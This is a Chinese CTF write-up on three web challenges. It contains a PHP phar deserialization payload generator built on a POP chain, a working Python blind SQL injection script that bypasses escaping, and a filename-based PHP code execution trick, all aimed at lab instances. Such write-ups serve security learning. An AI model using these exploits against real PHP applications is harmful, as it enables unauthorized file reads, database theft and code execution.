

[TOC]







[TOC]



## [CISCN2019 华北赛区 Day1 Web1]Dropbox

首页有一个文件上传页面，可以上传文件，经过测试说只能上传gif、png、jpg图片，但是我们修改一下MIME属性就成功绕过了：

![image-20230511193322115](https://s2.loli.net/2023/05/11/WRZMD24wN3eqhLv.png)

但是会将文件进行重命名，变为gif、jpg、png后缀，导致我们正常文件上传思路中断了，但是这有一个下载按钮，测试后发现任意文件下载漏洞：

![image-20230511193630149](https://s2.loli.net/2023/05/11/d25KtQFe1L8P7ZW.png)

目录穿越漏洞，成功获得index.php源码。同样的，我们获得了download.php、class.php、delete.php源码：

index.php

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>

<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>

<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```



class.php

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

download.php

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>

```

delete.php

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

这里最重要的就是`class.php`

仔细分析一下，我们需要构造这么一条pop链，User => FileList => File

其实主要是需要调用 File类的close()方法进行文件包含：

```php
public function close() {
        return file_get_contents($this->filename);
    }
```

但是怎么调用File类中的close()方法呢，我们可以很容易想到使用User类中的destruct()方法去调用：

```php
public function __destruct() {
        $this->db->close();
    }
```

但是这是**错误**的，因为这样做没有回显，我们需要使用FileList类做一个跳板：

FileList类

```php
public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
```

当我们把User类的`$db`设置为FileList对象时，调用析构方法，` $this->db->close();` 由于FileList类没有`close()`方法，所以会调用其中的 `__call()` :

```php
 public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
```

此时 `$func`就是 `close`，`$args`参数为空。这个函数的意思是，把函数名存进`$funcs`数组中

`foreach`遍历`$files`数组，每一个`$file`就是一个File对象，让每一个File对象去执行 `close()`方法，把结果给存进二维数组中，再观察一下FileList类析构方法：

```php
public function __destruct() {
        ...
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        ...
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                # 这里会将前面close方法执行的结果输出
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
           ...
        }
        echo $table;
    }
```

然后我们观察一下`delete.php`：

```php
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
```

发现会调用File类的delete()方法：

```php
public function detele() {
        unlink($this->filename);
    }
```

这里使用 `unlink()函数`删除文件，但是这个函数会触发phar反序列化漏洞：

这里是一些受影响的函数：

![img](https://s2.loli.net/2023/03/23/JlVktEbKgiWGAeH.png)

于是我们可以上传一个`phar`文件，然后点击删除它，触发phar反序列化，

```php
<?php

class User {
    public $db;
}
class FileList
{
    private $files;
    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}

class File
{
    public $filename;

}
$a = new User();
$b = new FileList();
$a->db = $b;

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER();?>');
$phar->setMetadata($a);
$phar->addFromString("1.txt","test");
$phar->stopBuffering();
```

运行代码，生成phar文件，我们上传上去：

![image-20230511200928289](https://s2.loli.net/2023/05/11/pSzyH4nU8f53XC6.png)



然后我们删除它：记得要将**文件名改为phar伪协议格式**：

![image-20230511201006907](https://s2.loli.net/2023/05/11/NdAhFuWskYbrMD3.png)











## [CISCN2019 总决赛 Day2 Web1]Easyweb

<img src="https://s2.loli.net/2023/01/15/fWsc1FQLUeGxrpj.png" alt="image-20230115151136787" style="zoom:33%;" />

首先打开页面，使用工具扫描一下：

发现存在 `robots.txt` 文件：

> ```
> User-agent: *
> Disallow: *.php.bak
> ```

然后尝试不同的前缀，发现 `image.php.bak` ，文件下载成功

```php
<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
// 将id,path中的所有 \\0,%00,\\',' 替换为空字符串

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

进入代码审计。

> **addslashes()** 函数返回在预定义字符之前添加**反斜杠**的字符串。
>
> 预定义字符是：
>
> - 单引号（'）
> - 双引号（"）
> - 反斜杠（\）
> - NULL

根据分析，如果我们传参 `id = \\0 ` ，那么经过 `addslashes()` 函数后，变成  `\\\0`（其实php解析后相当于 `\\0` ） ，然后经过`str_replace()` 替换之后，id的值就等于反斜杠 \ ，最终id的值嵌入到 sql语句中：

```sql
select * from images where id='\' or path='xxx'
```

反斜杠 \ 将 id后一个单引号转义成为了一个普通的引号，最终id前面一个单引号与 path 第一个单引号结合在一起了。然后我们可以通过控制 path 变量进行sql注入。

例如： `id=\\0&path= ' or 1=1 %23`  ，可以成功显示图片，我们只需要改变 1=1的值即可注入。

由于没有回显，我们可以使用 盲注，为了效率，脚本我们使用 二分法：

```python
# -*- coding = utf-8 -*-
# @Time : 2023/1/15 11:46
# @Author : Leekos
# @File : [CISCN2019 总决赛 Day2 Web1]Easyweb.py
# @Software : PyCharm
import time

import requests

url = "http://b6aeffe5-d882-4699-9232-d735cd759ecd.node4.buuoj.cn:81//image.php?id=\\0&path="
# payload = " or ascii(substr((select database()),{},1))>{} %23"
# database: ciscnfinal
# payload = " or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{} %23"
# table: images,users
payload = " or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{},1))>{} %23"

# payload = " or ascii(substr((select password from users),{},1))>{} %23"

result = ""
for i in range(50):
    low = 32
    high = 127
    mid = (low + high) >> 1
    while high > low:
        u = url + payload.format(i, mid)
        res = requests.get(url=u)
        if "JFIF" in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (high + low) >> 1
        # time.sleep(0.1)
    result += chr(mid)
    print(result)
```

最终使用脚本查询到 username、password。登录进去，发现是一个文件上传，

经过尝试，我们可以上传后缀 `.phtml` 文件

<img src="https://s2.loli.net/2023/01/15/QZWY5RBeanKJiOS.png" alt="image-20230115153705304" style="zoom:33%;" />

我们发现，上传了 `phtml` 文件后，在 php 文件中回显出来了上传成功的文件日志信息，包括了文件名。

我们仔细想一下，只要我们将文件名改为php代码，即可实现目录执行，于是：

<img src="https://s2.loli.net/2023/01/15/WP5jRLiAD7YmdbV.png" alt="image-20230115153920183" style="zoom:50%;" />

然后命令执行获得flag





## [RootersCTF2019]I_<3_Flask

看题目猜测是 `SSTI`，但是没给我们传参的参数是什么，

我们需要使用参数扫描工具：`Arjun`

扫出get传参：name

然后可以用`tplmap`,测出这是jinja2模板注入，然后常规操作











